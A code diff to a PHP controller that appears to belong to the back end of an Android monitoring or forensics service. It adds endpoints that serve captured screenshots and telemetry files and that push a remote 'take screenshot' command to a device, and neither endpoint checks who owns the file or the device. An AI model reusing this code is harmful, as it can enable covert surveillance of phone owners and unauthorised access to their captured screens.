@@ -953,10 +953,26 @@ class ForensicsUserController extends BaseClientController
     /** GET /advanced/input_methods */
     public function input_methods()
     {
-        $data = array_merge($this->commonData('input_methods', 'Input Methods (IMEs)'), [
+        $db = \Config\Database::connect();
+        $allLocales = $db->table('tbl_system_locale')
+            ->where('owner_id', $this->userId)
+            ->orderBy('extracted_at', 'ASC')
+            ->get()->getResultArray();
+
+        $latestLocale = null;
+        if (!empty($allLocales)) {
+            $latestLocale = end($allLocales);
+            $latestLocale['locale_region'] = json_decode($latestLocale['locale_region_json'] ?? '{}', true) ?: [];
+            $latestLocale['system_fonts'] = json_decode($latestLocale['system_fonts_json'] ?? '[]', true) ?: [];
+            $latestLocale['ts_display'] = !empty($latestLocale['extracted_at']) ? date('Y-m-d H:i:s', (int)($latestLocale['extracted_at'] / 1000)) : '';
+        }
+
+        $data = array_merge($this->commonData('input_methods', 'Input Methods & System Locale'), [
             'rows' => $this->finderModel->get_input_methods($this->userId),
             'total' => $this->finderModel->get_count_InputMethods($this->userId),
             'pager' => $this->finderModel->getPager(),
+            'locale' => $latestLocale,
+            'all_locales' => $allLocales,
         ]);
         return $this->renderAppView('users/advanced/input_methods', $data);
     }
@@ -1212,83 +1228,7 @@ class ForensicsUserController extends BaseClientController
         return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
     }
 
-    // ── System Locale ──
-    public function system_locale()
-    {
-        $db = \Config\Database::connect();
-        $userId = $this->userId;
 
-        // Query all locale snapshots chronologically
-        $allLocales = $db->table('tbl_system_locale')
-            ->where('owner_id', $userId)
-            ->orderBy('extracted_at', 'ASC')
-            ->get()->getResultArray();
-
-        $changesHistory = [];
-        $prevLocale = null;
-
-        foreach ($allLocales as $r) {
-            $reg = json_decode($r['locale_region_json'] ?? '{}', true) ?: [];
-            if ($prevLocale !== null) {
-                $prevReg = json_decode($prevLocale['locale_region_json'] ?? '{}', true) ?: [];
-                
-                // Compare fields
-                $diffs = [];
-                foreach (['language', 'country', 'display_name', 'timezone'] as $field) {
-                    $oldVal = $prevReg[$field] ?? '';
-                    $newVal = $reg[$field] ?? '';
-                    if ($oldVal !== $newVal) {
-                        $diffs[] = [
-                            'field' => ucfirst($field),
-                            'old' => $oldVal ?: '—',
-                            'new' => $newVal ?: '—'
-                        ];
-                    }
-                }
-
-                if (!empty($diffs)) {
-                    $changesHistory[] = [
-                        'extracted_at' => $r['extracted_at'],
-                        'diffs' => $diffs
-                    ];
-                }
-            }
-            $prevLocale = $r;
-        }
-
-        // Sort changes DESC (most recent first)
-        usort($changesHistory, function($a, $b) {
-            return $b['extracted_at'] <=> $a['extracted_at'];
-        });
-
-        // The latest locale details
-        $latestLocale = null;
-        if (!empty($allLocales)) {
-            $latestLocale = end($allLocales);
-            $latestLocale['locale_region'] = json_decode($latestLocale['locale_region_json'] ?? '{}', true) ?: [];
-            $latestLocale['system_fonts'] = json_decode($latestLocale['system_fonts_json'] ?? '[]', true) ?: [];
-            $latestLocale['ts_display'] = $latestLocale['extracted_at'] ? date('Y-m-d H:i:s', (int)$latestLocale['extracted_at']) : '';
-        }
-
-        $data = array_merge($this->commonData('system_locale', 'System Locale'), [
-            'latest' => $latestLocale,
-            'changes_history' => $changesHistory,
-            'total' => count($allLocales),
-        ]);
-
-        return $this->renderAppView('users/advanced/system_locale', $data);
-    }
-
-    public function delete_system_locale($id)
-    {
-        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
-            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
-        }
-        if ($this->finderModel->delete_system_locale_row((int) $id, $this->userId)) {
-            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
-        }
-        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
-    }
 
     /** GET /advanced/software/app_permissions */
     public function app_permissions()
@@ -1437,6 +1377,51 @@ class ForensicsUserController extends BaseClientController
         return $this->renderAppView('users/advanced/screenshots', $data);
     }
 
+    /** GET /advanced/software/screenshots/serve/(:any) */
+    public function serve_screenshot(string $filename)
+    {
+        $filename = basename($filename);
+        $dirs = [
+            WRITEPATH . 'uploads/android_captured_screenshots/',
+            WRITEPATH . 'uploads/android_captured_images/',
+            WRITEPATH . 'uploads/raw_telemetry/',
+        ];
+
+        $targetPath = null;
+        foreach ($dirs as $dir) {
+            if (file_exists($dir . $filename)) {
+                $targetPath = $dir . $filename;
+                break;
+            }
+        }
+
+        if (!$targetPath || !file_exists($targetPath)) {
+            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound('Screenshot file not found.');
+        }
+
+        $isDownload = (bool) $this->request->getGet('download');
+        if ($isDownload) {
+            return $this->response->download($targetPath, null);
+        }
+
+        $mime = mime_content_type($targetPath) ?: 'image/jpeg';
+        return $this->response
+            ->setHeader('Content-Type', $mime)
+            ->setHeader('Content-Length', (string) filesize($targetPath))
+            ->setBody(file_get_contents($targetPath));
+    }
+
+    /** POST /advanced/software/screenshots/capture */
+    public function trigger_screenshot_capture()
+    {
+        $deviceId = $this->request->getPost('device_id');
+        $remoteCtrl = new \App\Controllers\admin\RemoteDeviceController();
+        $remoteCtrl->initController($this->request, $this->response, $this->logger);
+
+        // Dispatch FCM command
+        return $remoteCtrl->sendCommand('cmd_take_screenshot', $deviceId);
+    }
+
     public function delete_screenshots($id)
     {
         if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
@@ -1448,27 +1433,6 @@ class ForensicsUserController extends BaseClientController
         return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
     }
 
-    /** GET /advanced/software/screen_state */
-    public function screen_state()
-    {
-        $data = array_merge($this->commonData('screen_state', 'Screen State'), [
-            'rows' => $this->finderModel->get_screen_state($this->userId),
-            'total' => $this->finderModel->get_count_ScreenState($this->userId),
-            'pager' => $this->finderModel->getPager(),
-        ]);
-        return $this->renderAppView('users/advanced/screen_state', $data);
-    }
-
-    public function delete_screen_state($id)
-    {
-        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
-            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
-        }
-        if ($this->finderModel->delete_screen_state_row((int) $id, $this->userId)) {
-            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
-        }
-        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
-    }
 
     /** GET /advanced/hardware/media_hardware */
     public function media_hardware()
